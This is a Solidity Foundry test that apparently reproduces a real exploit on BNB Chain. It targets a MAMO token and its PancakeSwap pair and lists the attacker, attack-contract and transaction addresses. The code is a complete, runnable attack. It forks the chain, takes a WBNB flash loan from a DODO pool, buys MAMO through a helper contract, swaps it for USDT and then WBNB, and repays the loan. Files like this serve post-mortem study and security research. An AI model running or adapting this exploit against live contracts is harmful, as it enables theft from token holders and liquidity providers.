// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : $3.3K
// Attacker : https://bscscan.com/address/0x829fe73463ceae6579973b8bcd1e018976040ec4
// Attack Contract : https://bscscan.com/address/0xd7a7d90b63da1b4e7ef79cb36935d38af0d6d0b4
// Vulnerable Contract : https://bscscan.com/address/0x5813d7818c9d8f29a9a96b00031ef576e892def4
// Attack Tx : https://bscscan.com/tx/0x189a8dc1e0fea34fd7f5fa78c6e9bdf099a8d575ff5c557fa30d90c6acd0b29f

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5813d7818c9d8f29a9a96b00031ef576e892def4#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    DVM dvm = DVM(0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address tokenAddress = 0x4341bdCEd3908A45835C67A2DbBDe2d2dAA6645D;
    IWBNB MAMO = IWBNB(payable(tokenAddress));
    address usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
    IERC20 usdt = IERC20(payable(usdtAddress));
    IPancakePair pair = IPancakePair(0x5813d7818c9d8F29A9a96B00031ef576E892DEf4);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    event log_Data(bytes data);

    function setUp() external {
        cheats.createSelectFork("bsc", 34083189-1);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", wbnb.balanceOf(address(this)), 18);
                emit log_named_uint("[Begin] Attacker MAMO before exploit", MAMO.balanceOf(address(this)));
        address me = address(this);
        dvm.flashLoan(0, 19_000_000_000_000_000_000, me, "0x21");
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", wbnb.balanceOf(address(this)), 18);
                emit log_named_uint("[End] Attacker MAMO after exploit", MAMO.balanceOf(address(this)));
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes memory data) public {
        wbnb.withdraw(quoteAmount);

        address buyTokenContractAddress = 0xa915Bb6D5C117fB95E9ac2edDaE68AAd5EdB5841;
        (bool successBuyToken,) = buyTokenContractAddress.call{value: quoteAmount}(abi.encodeWithSignature("BuyToken(address)", 0x5813d7818c9d8F29A9a96B00031ef576E892DEf4)); // attacker contract gained 95,000,000 MAMO
        require(successBuyToken, "BuyToken failed");

        (uint256 _amount0, uint256 _amount1,) = pair.getReserves();
        uint256 amount_out = router.getAmountOut(9500000000000000000000000, _amount0, _amount1);
        pair.swap(0, amount_out, address(this), "");

        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.approve(address(router), usdtBalance);

        address[] memory path = new address[](2);
        path[0] = usdtAddress;
        path[1] = address(wbnb); 
        uint256[] memory amounts = router.swapExactTokensForTokens(usdtBalance, 0, path, address(this), block.timestamp + 60);

        wbnb.transfer(address(dvm), 19_000_000_000_000_000_000); //payback
    }


    fallback() external payable {}

}
